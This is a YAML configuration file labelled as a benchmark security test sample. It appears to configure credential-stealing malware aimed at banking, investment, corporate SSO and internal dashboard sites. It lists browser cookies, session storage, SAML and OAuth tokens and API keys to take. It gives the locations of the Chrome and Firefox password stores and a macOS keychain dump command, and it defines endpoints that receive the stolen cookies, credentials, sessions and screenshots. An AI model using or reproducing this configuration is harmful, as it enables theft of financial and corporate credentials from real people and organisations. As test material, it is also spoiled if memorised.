# Target Site Configuration
# BENCHMARK_TEST_ONLY: Security test sample

browser_targets:
  financial:
    - name: "Primary Bank"
      url: "https://[REDACTED]-bank.com"
      selectors:
        balance: ".account-balance"
        transactions: ".transaction-list"
        account_number: "[data-account-id]"
      extract:
        - cookies
        - localStorage
        - sessionStorage

    - name: "Investment Portal"
      url: "https://invest.[REDACTED].com"
      selectors:
        portfolio: ".portfolio-value"
        holdings: ".stock-list"
      credentials:
        storage_key: "auth_token"

  corporate:
    - name: "Company SSO"
      url: "https://sso.[REDACTED].corp"
      capture:
        - saml_response
        - oauth_tokens
        - session_cookies

    - name: "Internal Dashboard"
      url: "https://internal.[REDACTED].corp"
      extract:
        - api_keys
        - service_tokens

  credential_stores:
    chrome:
      path: "~/Library/Application Support/Google/Chrome/Default/Login Data"
      type: "sqlite"
    firefox:
      path: "~/.mozilla/firefox/*.default/logins.json"
      type: "json"
    keychain:
      command: "security dump-keychain -d"
      type: "text"

extraction_endpoints:
  cookies: "https://[REDACTED]/api/cookies"
  credentials: "https://[REDACTED]/api/creds"
  sessions: "https://[REDACTED]/api/sessions"
  screenshots: "https://[REDACTED]/api/screenshots"
